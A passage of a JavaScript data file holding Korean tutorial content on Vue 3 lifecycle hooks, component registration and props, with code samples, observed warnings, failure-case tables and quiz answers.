        body: "훅 목록(Composition / Options): setup(Options의 beforeCreate·created 자리), onBeforeMount/beforeMount(DOM 생성 전), onMounted/mounted(DOM 삽입 뒤. '모든 동기 자식이 마운트된 뒤'. 비동기 컴포넌트·Suspense 안은 제외), onBeforeUpdate/beforeUpdate(반응형 변경으로 DOM 갱신 직전. 상태 변경 안전), onUpdated/updated(DOM 갱신 뒤. 부모는 자식 뒤. 특정 변경을 기다리려면 nextTick. '여기서 상태를 바꾸면 무한 갱신 루프'), onBeforeUnmount/beforeUnmount(인스턴스 아직 온전), onUnmounted/unmounted(자식 언마운트·효과 정지 뒤. 타이머·리스너·연결 정리), onErrorCaptured/errorCaptured, onRenderTracked/onRenderTriggered(개발 전용), onActivated/onDeactivated(KeepAlive), onServerPrefetch/serverPrefetch(서버 전용). '이 페이지의 모든 API는 setup 중 동기로 불러야 한다'. SSR에서는 beforeMount 이후 훅이 돌지 않습니다(Options는 beforeCreate·created만). 문서의 다이어그램은 setup → beforeCreate → created → beforeMount → (렌더) → mounted → [beforeUpdate → updated]* → beforeUnmount → unmounted.",
        code: "<script setup>\nimport { onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted } from 'vue'\n\n// setup 자체 = 인스턴스 생성 시점 (Options 의 beforeCreate · created)\nonBeforeMount(() => { /* DOM 아직 없음 · ref null */ })\nonMounted(() => { /* DOM 있음 · 동기 자식도 마운트됨 · 서드파티 초기화 · 측정 */ })\nonBeforeUpdate(() => { /* DOM 갱신 직전 · 상태 변경 안전 */ })\nonUpdated(() => { /* DOM 갱신 뒤 · 자식 먼저 · 여기서 상태 바꾸면 루프 */ })\nonBeforeUnmount(() => { /* 아직 온전 */ })\nonUnmounted(() => { /* 타이머 · 리스너 · 연결 정리 */ })\n\n// ✗ 비동기 등록 — 동작하지 않음\nsetTimeout(() => { onMounted(() => {}) }, 100)\n// ✓ 외부 함수라도 호출 스택이 setup 에서 동기로 이어지면 OK\nuseMyHook()   // 안에서 onMounted(...)\n</script>\n\n// Options API — 화살표 함수 X (this 없음)\nexport default { mounted() { console.log(this.$el) } }",
        terms: [
          {
            term: "동기 등록 (synchronous registration)",
            body: "onMounted 같은 훅 함수는 '지금 setup 중인 컴포넌트 인스턴스'를 내부 전역에서 찾아 그 인스턴스에 콜백을 매답니다. setup이 끝나면 그 전역은 비워지므로, setTimeout·await 뒤에 부르면 매달 인스턴스가 없어 경고와 함께 무시됩니다. 컴포저블 안에서 부르는 것은 setup이 동기로 그 함수를 부르는 동안이라 괜찮습니다. React 노드의 '훅은 렌더 중에만'(디스패처)과 같은 구조입니다.",
          },
          {
            term: "mounted 의 보장",
            body: "onMounted는 '이 컴포넌트의 DOM이 만들어져 부모 컨테이너에 삽입되었고, 동기 자식 컴포넌트들도 모두 마운트되었다'를 보장합니다. 실제로 돌려 보면 자식 mounted가 부모 mounted보다 먼저였고 부모 mounted에서 자식 DOM 셋이 전부 있었습니다. 보장하지 않는 것: 비동기 컴포넌트와 Suspense 안의 자식(아직 로딩 중일 수 있음), 그리고 앱의 루트 컨테이너가 문서에 붙어 있지 않으면 in-document도 아닙니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 부모와 자식에 훅 전부를 걸고 마운트·갱신·언마운트했습니다. 마운트: 부모 setup → 부모 beforeMount → 자식 setup → 자식 beforeMount → 자식 mounted → 부모 mounted. 자식의 setup은 부모의 beforeMount 뒤(부모 렌더 함수가 돌면서 자식을 만날 때)입니다. 갱신(prop n 변경): 부모 beforeUpdate → 자식 beforeUpdate → 자식 updated → 부모 updated. 언마운트: 부모 beforeUnmount → 자식 beforeUnmount → 자식 unmounted → 부모 unmounted. before*는 위에서 아래로, 완료 훅은 아래에서 위로입니다. 부모 mounted에서 this.$el.querySelectorAll('p').length는 3(자식 둘의 DOM 전부). 루트가 둘인 자식의 mounted에서 this.$el은 텍스트 노드(자리표시), 루트 하나는 P. 커스텀 디렉티브 훅도 같은 틀: created → beforeMount → mounted → beforeUpdate → updated → beforeUnmount → unmounted. Node의 서버 렌더에서 자식에 onBeforeMount·onMounted·onServerPrefetch를 걸고 부모에 onMounted를 걸었을 때 돈 것은 'child serverPrefetch'만. 서버에는 마운트가 없습니다. KeepAlive 안에서는 mounted 대신 activated/deactivated가 반복되고 캐시에서 밀릴 때 unmounted(내장 컴포넌트 노드). 템플릿 ref는 setup·beforeMount에서 null, mounted에서 요소였습니다.",
        code: "// Chrome 156 · vue 3.5.45\n마운트:   parent setup → parent beforeMount → child setup → child beforeMount → child mounted → parent mounted\n갱신:     parent beforeUpdate → child beforeUpdate → child updated → parent updated\n언마운트:  parent beforeUnmount → child beforeUnmount → child unmounted → parent unmounted\n→ before* 는 위→아래 · 완료 훅은 아래→위\n\nparent mounted: 자식 DOM <p> 3개 전부 있음   ·   multi-root $el → 텍스트 노드 (자리표시) · single-root $el → P\n디렉티브: created → beforeMount → mounted(arg=foo mods={bar:true} value=0) → beforeUpdate → updated(old=0 new=1) → beforeUnmount → unmounted\n\n// Node — SSR\n돈 훅: ['child serverPrefetch']   (beforeMount · mounted 안 돎)\n\n// 템플릿 ref: setup null · beforeMount null · mounted INPUT",
      },
      {
        label: "문제: 창 크기 리스너가 페이지를 오갈수록 쌓인다",
        body: "onMounted(() => window.addEventListener('resize', onResize))만 쓰고 정리를 안 했습니다. 라우트를 오갈 때마다 컴포넌트가 다시 마운트되어 리스너가 쌓이고, 떠난 컴포넌트의 onResize가 사라진 DOM을 만지려다 에러를 냅니다. 처방은 onUnmounted(() => window.removeEventListener('resize', onResize))입니다. 실제로 돌려 보면 언마운트 때 beforeUnmount → unmounted가 돌았습니다. 같은 짝이 필요한 것: setInterval/clearInterval, 서드파티 인스턴스 init/destroy, 소켓 open/close, IntersectionObserver observe/disconnect. 컴포저블로 묶으면 useEventListener(window, 'resize', fn)처럼 등록과 정리를 한 함수에 두어 빠뜨리지 않습니다(재사용성 노드). watchEffect의 onCleanup, effectScope의 onScopeDispose도 같은 역할입니다.",
      },
      {
        label: "문제가 나는 경우: 시점에 없는 것을 찾거나 정리를 잊을 때",
        body: "경우 ㄱ, 정리 누락입니다. 위의 사고입니다. 경우 ㄴ, setup·beforeMount에서 DOM·ref 접근. 아직 없음(실제로 null). onMounted. 경우 ㄷ, 비동기로 훅 등록. 무시·경고. 동기로. 경우 ㄹ, updated에서 상태 변경. 무한 루프(문서 경고). beforeUpdate나 watch로. 경우 ㅁ, 부모 mounted에서 비동기 자식 DOM 기대. Suspense·async 자식은 보장 밖. 자식의 onMounted나 Suspense resolve 이벤트. 경우 ㅂ, 서버에서 onMounted 기대. 안 돎(실제로). 서버 일은 setup·onServerPrefetch, 브라우저 일은 onMounted. 경우 ㅅ, setup에서 window·document 접근(SSR). 서버에서 ReferenceError. onMounted. 경우 ㅇ, KeepAlive 안에서 mounted로 매번 초기화 기대. 캐시되면 activated만. onActivated. 경우 ㅈ, Options 훅을 화살표 함수로. this 없음. 일반 함수. 경우 ㅊ, updated로 특정 변경을 기다림. 모든 갱신에 돌아 구분 못 함. watch + flush post 또는 nextTick. 경우 ㅋ, unmounted에서 DOM 측정. 이미 떨어짐. beforeUnmount. 경우 ㅌ, 자식 mounted가 부모보다 늦을 거라 가정. 자식 먼저(실제로). 부모 mounted에서 자식 DOM 사용 가능.",
        code: "경우               언제 생기나                        겉모습                                 처방\nㄱ 정리 누락        addEventListener 만                 누적 · 사라진 DOM 접근                   onUnmounted 짝 · 컴포저블\nㄴ 마운트 전 DOM     setup/beforeMount 에서 ref           null (실제로)                           onMounted\nㄷ 비동기 등록       setTimeout 안 onMounted             무시 · 경고                             동기\nㄹ updated 상태 변경  onUpdated(() => x.value++)          무한 루프                               beforeUpdate · watch\nㅁ 비동기 자식 기대   Suspense/async 자식 DOM             아직 없음                               자식 onMounted · @resolve\nㅂ 서버 mounted      SSR 에서 기대                       안 돎 (실제로 serverPrefetch 만)          setup · onServerPrefetch\nㅅ 서버 window       setup 에서 window                   ReferenceError                         onMounted\nㅇ KeepAlive 재초기화  mounted 기대                       activated 만                           onActivated\nㅈ 화살표 훅        mounted: () => this.x               this 없음                              일반 함수\nㅊ updated 로 특정 변경  매 갱신                          구분 불가                               watch (post) · nextTick\nㅋ unmounted 측정    DOM 떨어진 뒤                        없음                                   beforeUnmount\nㅌ 순서 오해        부모 mounted 가 먼저라 가정             자식 먼저 (실제로)                        -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 훅은 '트리의 시간' 에 놓인 지점이고, 각 지점에 있는 것이 다르다",
        body: "컴포넌트 인스턴스의 시간은 셋입니다. 생성(setup: 상태는 있고 DOM은 없음), 마운트(DOM이 생기고 붙음), 갱신(상태 → DOM 반복), 소멸(DOM이 떨어지고 효과가 멈춤). 훅은 그 경계에 놓인 지점이라 '그 시점에 있는 것'만 쓸 수 있습니다. DOM은 mounted부터(ㄴ, ㅋ), 서버에는 마운트 자체가 없고(ㅂ, ㅅ), KeepAlive는 마운트 대신 활성화를 반복합니다(ㅇ). 트리라서 순서가 있습니다. before*는 부모 먼저, 완료는 자식 먼저(ㅌ), 비동기 자식은 그 순서 밖(ㅁ). 등록은 setup 중 동기여야 어느 인스턴스의 지점인지 알 수 있고(ㄷ), 갱신 지점에서 상태를 바꾸면 갱신이 갱신을 부릅니다(ㄹ). 시작한 것은 끝 지점에서 정리합니다(ㄱ). 처방은 '이 코드가 필요한 것(DOM? 자식? 브라우저?)이 어느 지점부터 있나'를 묻고 그 지점에 걸고, 짝이 되는 끝 지점에 정리를 거는 것입니다.",
        code: "생성 (setup)       상태 ✓ · DOM ✗ · 서버에서도 돈다 (serverPrefetch 포함)\n  ↓ beforeMount    (부모 → 자식 순)\n마운트 (mounted)   DOM ✓ · 동기 자식 ✓ (자식 → 부모 순) · 비동기 자식 ✗ (ㅁ) · 서버 ✗ (ㅂ ㅅ) · KeepAlive 는 activated (ㅇ)\n  ↓ beforeUpdate → updated   (상태 바꾸면 루프 ㄹ)\n소멸 (beforeUnmount → unmounted)   시작한 것 정리 (ㄱ) · DOM 은 beforeUnmount 까지 (ㅋ)\n\n등록: setup 중 동기 (ㄷ)   ·   묻기: 필요한 것이 어느 지점부터 있나? → 그 지점 + 짝의 정리",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "필수 개념이 끝났습니다. 다음 장 '컴포넌트 심화'는 컴포넌트 경계의 세 통로(props·이벤트·slot)와 그 변형(v-model, 폴스루 속성, provide/inject, 비동기 컴포넌트)을 계약으로 명시합니다. 실제로 돌려 보면 props 검증 경고 셋, 3.5의 반응형 구조 분해가 컴파일되는 모양, 다중 루트 폴스루 경고를 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 지도 라이브러리를 초기화하고, 마커 데이터가 바뀌면 갱신하고, 떠날 때 해제해야 합니다. 어느 훅들? (2) 부모가 mounted에서 자식 <AsyncChart>(defineAsyncComponent)의 DOM을 재려는데 없습니다. 왜? (3) 서버 렌더되는 컴포넌트에서 localStorage의 테마를 읽어 초기 class를 정하려 setup에 넣었더니 서버가 터집니다. 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) 초기화는 onMounted(컨테이너 요소가 그때부터 있음. 실제로 beforeMount까지는 ref가 null), 갱신은 watch(markers, update, { deep: true })(마커가 reactive면 deep 자동. DOM 크기가 필요하면 flush: 'post'), 해제는 onUnmounted에서 map.remove(). 지도 인스턴스는 reactive에 넣지 않고 shallowRef나 보통 변수에 둡니다. (2) mounted는 '동기 자식'만 보장합니다. defineAsyncComponent나 Suspense 안의 자식은 로더가 끝난 뒤 따로 마운트되어 부모 mounted 시점에 없을 수 있습니다. 자식 안의 onMounted에서 재거나, 자식이 emit('ready')를 올리게 하거나, Suspense의 @resolve를 듣습니다. (3) 서버에는 window·localStorage가 없어 setup에서 읽으면 ReferenceError이고, 서버에서는 mounted가 돌지 않습니다(실제로 serverPrefetch만). 테마는 onMounted에서 읽어 ref에 넣고, 서버 HTML은 기본 테마로 냅니다. 그러면 첫 페인트 뒤 테마가 바뀌는 깜빡임이 있으므로, 그것이 싫으면 테마를 쿠키에 두어 서버가 요청에서 읽거나(SSR 노드), 하이드레이션 전 인라인 스크립트로 class를 먼저 붙이고 그 요소에 data-allow-mismatch를 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Lifecycle Hooks", href: `${DOCS}/guide/essentials/lifecycle` },
      { label: "Composition API: Lifecycle Hooks", href: `${DOCS}/api/composition-api-lifecycle` },
      { label: "Options: Lifecycle", href: `${DOCS}/api/options-lifecycle` },
    ],
  },

  {
    id: "vg-components",
    name: "컴포넌트 심화",
    tagline: "경계의 세 통로를 계약으로: props 검증, emits 선언, v-model 매크로, 폴스루, 슬롯, provide/inject, 비동기",
    intro:
      "가이드의 셋째 장, 여덟 페이지입니다. 등록(전역·로컬), Props(선언·검증·단방향·Boolean 캐스팅·3.5 반응형 구조 분해), 컴포넌트 이벤트(emit·defineEmits·검증), 컴포넌트 v-model(3.4 defineModel), 폴스루 속성(class·style·리스너 자동 전달과 inheritAttrs), 슬롯(기본·이름·범위), Provide/inject(prop drilling 대신), 비동기 컴포넌트(defineAsyncComponent·3.5 지연 하이드레이션). 기초가 '통로가 셋 있다'라면 심화는 '그 통로의 계약을 어떻게 적나'입니다. 실제로 돌려 보면 props 검증은 세 가지 경고를 냈고, defineModel은 modelValue prop과 update:modelValue 이벤트와 useModel 호출로 컴파일됐고, 구조 분해한 prop을 watch에 넘기면 컴파일 에러였고, 다중 루트에 class·리스너를 넘기면 두 가지 경고였고, 비동기 컴포넌트는 loading → 도착/에러/타임아웃 셋을 각각 그렸습니다.",
    blocks: [
      {
        label: "여덟 페이지 한눈에",
        body: "페이지마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지            핵심 한 줄                                                     실제로 돌려 본 것\n1 등록            전역 app.component (트리 셰이킹 X) · 로컬 components / import           부모의 로컬 등록은 자식 템플릿에 안 보임 ('Failed to resolve …')\n2 Props          선언 · 검증 · 단방향 · Boolean 캐스팅 · 3.5 구조 분해 → __props.x        경고 셋 · props.x = 2 → readonly 경고 · 객체 안은 통과 · watch(구조분해) 컴파일 에러\n3 이벤트          emit · defineEmits · 검증 · emits 선언이 네이티브 폴스루를 끊음              emits:['click'] → 네이티브 click 안 옴 · 미선언 → 폴스루\n4 v-model         3.4 defineModel = modelValue + update:modelValue + useModel             compileScript: _mergeModels({ \"modelValue\": …, \"modelModifiers\": {} }) · _useModel(__props, \"modelValue\")\n5 폴스루 속성      class·style·리스너 → 단일 루트 · inheritAttrs:false + $attrs · 비반응       'base extra' 병합 · 다중 루트 → 경고 둘 (attributes · event listeners)\n6 슬롯            <slot> 자리 · 폴백 · #name · 범위 슬롯은 자식 → 부모 데이터               폴백 렌더 · 'Mixed v-slot usage on both the component and nested <template>' 컴파일 에러\n7 Provide/inject   setup 중 동기 · 기본값 · ref 를 넘기면 반응 · readonly · Symbol 키         ref provide → 자식 갱신 · readonly 쓰기 경고 · Teleport 안에서도 inject ✓ · SSR ✓\n8 비동기 컴포넌트   defineAsyncComponent · loading/error/timeout · 3.5 hydrateOn*           'loading…' → 'lazy 도착' / 'error: Failed to fetch…' / 'timeout' · onError attempts=1",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 계약을 '선언' 으로 적으면 Vue 가 검사하고, 적지 않으면 조용히 새거나 겹친다",
        body: "이 장의 여덟 페이지는 전부 '선언'입니다. props를 선언하면 타입·필수·검증이 검사되고(경고), 선언하지 않은 속성은 폴스루로 루트에 가고(병합 또는 경고), emits를 선언하면 같은 이름의 네이티브 리스너가 폴스루에서 빠지고, defineModel은 그 둘을 한 번에 선언하고, slot은 자리를 선언하고, provide는 키를 선언합니다. 선언이 없는 자리에서 사고가 납니다. 미선언 click은 두 번 울리고, 다중 루트는 폴스루 자리가 없어 경고하고, 객체 prop의 안쪽 변경은 선언 밖이라 조용히 공유됩니다. 자식 여덟이 각각의 선언을 다룹니다.",
        code: "선언         검사·효과                                   선언 없으면\nprops        타입 · required · validator → 경고            폴스루로 루트에 (ㅍ) · 객체 안 변경은 조용히 공유\nemits        이름 · 페이로드 검증 · 네이티브 폴스루 제외       네이티브 + emit 두 번\ndefineModel  modelValue prop + update 이벤트 자동           수동 prop/emit 짝\ninheritAttrs 자동 폴스루 on/off · $attrs 로 손으로            다중 루트 → 경고 · 버려짐\n<slot>       내용 자리 · 폴백 · 범위                        내용 버려짐\nprovide 키    inject 가 찾음 · Symbol 로 충돌 방지           'injection not found' 경고 · undefined",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '등록'부터입니다.",
      },
    ],
    sources: [
      { label: "Component Registration", href: `${DOCS}/guide/components/registration` },
      { label: "Async Components", href: `${DOCS}/guide/components/async` },
    ],
  },

  {
    id: "vg-comp-registration",
    name: "등록",
    tagline: "전역은 어디서나 되지만 트리 셰이킹이 안 되고, 로컬은 그 템플릿에서만 된다",
    intro:
      "컴포넌트 심화 첫 페이지입니다. 컴포넌트를 템플릿에서 태그로 쓰려면 Vue가 이름을 알아야 합니다. 전역 등록 app.component('MyComponent', MyComponent)는 앱의 모든 템플릿(하위 포함)에서 쓸 수 있지만 '빌드 시스템이 안 쓰는 컴포넌트를 제거(트리 셰이킹)하지 못하게 하고' 큰 앱에서 의존 관계를 흐립니다. 로컬 등록은 components 옵션에 적고 '그 컴포넌트에서만, 하위 컴포넌트에서는 안 됨'. <script setup>에서는 import만 하면 템플릿에서 바로 씁니다. 이름은 PascalCase 권장(SFC·문자열 템플릿). kebab-case 태그는 PascalCase 등록을 찾아갑니다(<my-component> → MyComponent). in-DOM 템플릿에서는 PascalCase를 못 씁니다. 실제로 돌려 보면 부모의 directives 옵션에 로컬 등록한 디렉티브는 자식 템플릿에서 'Failed to resolve directive'였고(컴포넌트도 같은 규칙), 등록 안 된 이름을 resolveComponent하니 'Failed to resolve component: Nope'와 함께 <Nope>가 그대로 나왔습니다. 이 노드의 질문은 하나입니다. 이름의 범위는 어디까지인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "전역: import { createApp } from 'vue'; const app = createApp({}); app.component('MyComponent', { /* 구현 */ }) 또는 import한 SFC. 체이닝 가능. 하위 컴포넌트 템플릿에서도 사용 가능. 단점 둘: '트리 셰이킹을 막는다'(등록만 하고 안 써도 번들에 남음), '큰 앱에서 의존 관계가 덜 명시적'(어디서 왔는지 추적 어려움). 로컬: <script setup>에서는 import ComponentA from './ComponentA.vue' 뒤 <ComponentA />. <script setup>이 아니면 export default { components: { ComponentA } }. 로컬은 '그 컴포넌트에서만 쓸 수 있고 하위 컴포넌트에서는 안 됨'. 이름 케이스: SFC·문자열 템플릿에서는 PascalCase 권장(JS 식별자와 같고 네이티브 요소와 구분). Vue는 kebab-case 태그를 PascalCase 등록으로 해석하므로 <MyComponent>와 <my-component> 둘 다 됩니다. in-DOM 템플릿은 소문자가 되니 kebab만.",
        code: "// 전역 — 어디서나 · 트리 셰이킹 X · 의존 숨음\nimport MyComponent from './App.vue'\napp.component('MyComponent', MyComponent).component('Other', Other)\n\n// 로컬 — <script setup>: import 만\n<script setup>\nimport ComponentA from './ComponentA.vue'   // 템플릿에서 <ComponentA /> 바로\n</script>\n\n// 로컬 — 보통 <script>\nexport default { components: { ComponentA, Renamed: ComponentB } }\n\n<!-- 이름: PascalCase 권장 · kebab 도 PascalCase 등록을 찾음 -->\n<MyComponent /> <my-component></my-component>   <!-- 둘 다 MyComponent -->\n<!-- in-DOM: kebab 만 -->",
        terms: [
          {
            term: "트리 셰이킹 (tree-shaking)",
            body: "번들러가 import 그래프를 따라가 실제로 쓰이지 않는 코드를 번들에서 빼는 최적화입니다. 전역 등록은 app.component('X', X)로 X를 '쓴' 셈이 되어, 템플릿에서 한 번도 안 써도 번들에 남습니다. 로컬 import는 쓰는 파일에서만 import되니 안 쓰면 빠집니다. JavaScript 노드 13장(모듈)과 번들링 허브가 이 자리입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 부모 컴포넌트의 directives 옵션에 local 디렉티브를 등록하고 자식 템플릿에서 v-local을 쓰니 '[Vue warn]: Failed to resolve directive: local'이었고 디렉티브는 동작하지 않았습니다. 로컬 등록은 그 컴포넌트의 템플릿에서만입니다. 컴포넌트의 components 옵션도 같은 규칙입니다. app.directive로 전역 등록하니 자식 템플릿에서 동작했습니다. Node에서 렌더 함수 안에 resolveComponent('Nope')를 부르니 '[Vue warn]: Failed to resolve component: Nope'와 함께 <Nope></Nope>가 그대로 HTML에 나왔습니다. 등록 안 된 이름은 네이티브 요소로 취급됩니다. in-DOM 템플릿의 <MyRow>는 브라우저가 <myrow>로 바꿔 'Failed to resolve component: myrow'였습니다. SFC의 이름 추론(파일명 → name)은 재귀 참조와 KeepAlive include에 쓰입니다(SFC 참고서·KeepAlive 노드).",
        code: "// Chrome 156\n부모 { directives: { local } } · 자식 템플릿 <b v-local>  → warn: Failed to resolve directive: local  (로컬은 그 템플릿만)\napp.directive('dir', …) · 자식 템플릿 <i v-dir>            → 동작 (전역)\n\n// Node\nh(resolveComponent('Nope'))  → warn: Failed to resolve component: Nope · HTML <Nope></Nope>  (네이티브 요소 취급)\n\n// in-DOM\n<MyRow> → <myrow> → warn: Failed to resolve component: myrow",
      },
      {
        label: "문제: 번들에 안 쓰는 컴포넌트 수십 개가 들어 있다",
        body: "디자인 시스템의 컴포넌트 80개를 플러그인에서 전부 app.component로 전역 등록했습니다. 어느 페이지도 쓰지 않는 컴포넌트까지 번들에 남아 초기 로드가 느립니다. 전역 등록은 '쓴 것'으로 간주되어 트리 셰이킹이 되지 않습니다. 처방은 쓰는 자리에서 import하는 것입니다. <script setup>이면 import만으로 됩니다. 정말 어디서나 쓰는 몇 개(BaseButton, BaseIcon)만 전역으로 두고, 그것도 자동 import 도구(unplugin-vue-components)를 쓰면 코드에는 import가 없되 번들에는 쓰는 것만 들어갑니다. 전역 등록은 의존 관계도 숨기므로 '이 컴포넌트가 어디서 왔나'를 파일에서 알 수 있는 로컬 import가 큰 앱의 기본입니다.",
      },
      {
        label: "문제가 나는 경우: 이름의 범위를 모를 때",
        body: "경우 ㄱ, 전역 남발입니다. 위의 사고입니다. 경우 ㄴ, 부모의 로컬 등록을 자식에서 씀. Failed to resolve(실제로). 자식에서 import. 경우 ㄷ, <script setup>에서 components 옵션. 불필요하고 보통 <script>가 필요. import만. 경우 ㄹ, 등록 안 된 이름을 씀. 네이티브 요소로 렌더되고 경고(실제로 <Nope>). import·등록. 경우 ㅁ, in-DOM에서 PascalCase. 소문자로 바뀌어 못 찾음(실제로). kebab. 경우 ㅂ, 전역 이름 충돌. 나중 등록이 덮음. 접두(Base·App). 경우 ㅅ, 네이티브 요소와 같은 이름(Button). 혼동·접두 권장(스타일 가이드). 경우 ㅇ, 재귀 컴포넌트가 자기 이름을 못 찾음. SFC는 파일명으로 추론, 아니면 name 옵션. 경우 ㅈ, 동적 컴포넌트에 문자열 이름을 넘기는데 <script setup>. 등록이 없어 못 찾음. 객체 전달. 경우 ㅊ, 플러그인이 등록한 컴포넌트를 타입이 모름. GlobalComponents 증강(TS 노드). 경우 ㅋ, 전역 등록 뒤 mount. 순서는 맞지만 mount 뒤 등록은 반영 안 됨. 경우 ㅌ, 같은 컴포넌트를 전역·로컬 둘 다. 로컬이 우선.",
        code: "경우               언제 생기나                       겉모습                                처방\nㄱ 전역 남발        app.component ×80                   번들에 전부                            import · 자동 import 도구\nㄴ 로컬을 자식에서    부모 components 옵션                 Failed to resolve (실제로)               자식에서 import\nㄷ setup 에 옵션     <script setup> + components         보통 <script> 필요                       import 만\nㄹ 미등록 이름       <Nope/>                            네이티브 요소 + 경고 (실제로)             등록\nㅁ in-DOM Pascal    <MyRow> in HTML                     myrow 못 찾음 (실제로)                   kebab\nㅂ 이름 충돌        같은 전역 이름 둘                    덮어씀                                접두\nㅅ 네이티브 이름     Button · Input                      혼동                                  BaseButton\nㅇ 재귀 이름        자기 참조                           못 찾음                                파일명 · name\nㅈ :is 문자열       <script setup> 'Foo'                못 찾음                                객체\nㅊ 타입 모름        플러그인 전역 컴포넌트                TS 에러                                GlobalComponents\nㅋ mount 뒤 등록     app.mount() 뒤 component            반영 안 됨                             mount 전\nㅌ 전역+로컬        둘 다 등록                          로컬 우선                              -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 이름 해석은 '가장 가까운 등록' 을 찾고, 등록의 범위가 비용을 정한다",
        body: "템플릿의 태그는 렌더 때 이름으로 해석됩니다. 로컬(그 컴포넌트의 components·<script setup> import) → 전역(app.component) → 없으면 네이티브 요소(경고 ㄹ). 로컬은 그 템플릿에서만 보여 하위에는 안 보이고(ㄴ), 전역은 어디서나 보이되 번들에 늘 남고 출처가 숨습니다(ㄱ, ㅂ). in-DOM 템플릿은 해석 전에 파서가 이름을 소문자로 바꿉니다(ㅁ). 처방은 '이 컴포넌트를 누가 쓰나'로 범위를 정하는 것입니다. 쓰는 파일에서 import(기본), 정말 전역이면 접두를 붙여 전역, 재귀·KeepAlive는 name을 명시.",
        code: "태그 이름 해석:  로컬 (components · <script setup> import) → 전역 (app.component) → 네이티브 요소 (+ 경고 ㄹ)\n  로컬:  그 템플릿만 (ㄴ) · 번들엔 쓰는 것만 · 출처 = import 줄\n  전역:  어디서나 · 번들에 늘 (ㄱ) · 출처 숨음 · 충돌 (ㅂ)\n  in-DOM: 해석 전에 파서가 소문자로 (ㅁ)\n\n범위 = 누가 쓰나 → import 기본 · 전역은 접두 · 재귀/KeepAlive 는 name",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "등록한 컴포넌트에 데이터를 내리는 계약이 다음 페이지 'Props'입니다. 실제로 돌려 보면 검증 경고 셋, Boolean 캐스팅, 3.5 반응형 구조 분해의 컴파일 결과를 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 디자인 시스템 패키지가 app.use(DS)로 컴포넌트 60개를 전역 등록합니다. 번들을 줄이려면? (2) <script setup>인 Layout.vue에서 import한 Sidebar를 그 자식 Page.vue 템플릿에서 썼더니 경고입니다. 왜? (3) 서버 템플릿에 in-DOM으로 <UserCard>를 썼는데 안 됩니다. 왜?",
        notes: [
          {
            title: "답",
            body: "(1) 패키지가 개별 export도 제공하면 전역 플러그인 대신 쓰는 파일에서 import { DsButton } from 'ds'로 가져옵니다. 트리 셰이킹이 쓰는 것만 남깁니다. import가 번거로우면 unplugin-vue-components 같은 자동 import로 코드에는 import가 없되 번들에는 쓰는 것만 들어갑니다. 전역 등록은 '쓴 것'으로 간주되어 60개가 전부 남습니다. (2) 로컬 등록(<script setup>의 import 포함)은 그 컴포넌트의 템플릿에서만 유효합니다. 하위 컴포넌트 템플릿에는 보이지 않습니다. 실제로 돌려 보면 부모의 로컬 디렉티브가 자식에서 'Failed to resolve'였습니다. Page.vue에서 직접 import합니다. (3) in-DOM 템플릿은 HTML 파서를 먼저 거쳐 <UserCard>가 <usercard>로 소문자가 되고, Vue는 usercard라는 등록을 못 찾아 'Failed to resolve component: usercard'를 냅니다(실제로 myrow에서 확인). <user-card></user-card>로 쓰면 kebab이 PascalCase 등록을 찾아갑니다. 닫는 태그도 명시합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Component Registration", href: `${DOCS}/guide/components/registration` },
      { label: "app.component()", href: `${DOCS}/api/application#app-component` },
      { label: "Style Guide — Base component names", href: `${DOCS}/style-guide/rules-strongly-recommended#base-component-names` },
    ],
  },

  {
    id: "vg-comp-props",
    name: "Props",
    tagline: "선언하면 검사된다: 타입·필수·검증, 단방향, Boolean 캐스팅, 그리고 3.5 의 반응형 구조 분해",
    intro:
      "컴포넌트 심화 둘째 페이지입니다. props는 부모가 자식에 내리는 데이터이고, 선언 방식이 셋입니다. 배열 defineProps(['foo']), 객체 defineProps({ title: String }), TS 타입 defineProps<{ title?: string }>(). 3.5+에서는 const { foo = 'hello' } = defineProps(…)로 구조 분해해도 반응형입니다(컴파일러가 props.foo로 바꿈). 단, 구조 분해한 변수를 watch에 그대로 넘기면 안 되고 getter로. 규칙: 템플릿에서는 kebab-case, 정적 속성은 문자열이라 숫자·불리언·객체는 v-bind, '단방향 데이터 흐름'이라 자식이 바꾸면 경고(객체 안쪽은 바뀌지만 피할 것), 검증(type·required·default·validator, 3.4+ validator 둘째 인자 전체 props), Boolean 캐스팅(속성만 있으면 true, 없으면 false, [String, Boolean]이면 ''). 실제로 돌려 보면 검증 경고 셋의 문구, props.x = 2의 readonly 경고, 객체 안 변경이 부모까지 바뀜, <Flags a c d>의 캐스팅 결과(true false \"\" true), compileScript가 구조 분해를 __props.msg로 바꾸고 기본값을 props 선언에 넣는 모양, watch(count)의 컴파일 에러 문구를 확인했습니다. 이 노드의 질문은 하나입니다. 선언이 무엇을 검사하고 무엇을 바꾸나.",
    blocks: [
      {
        label: "무엇을 다루나",
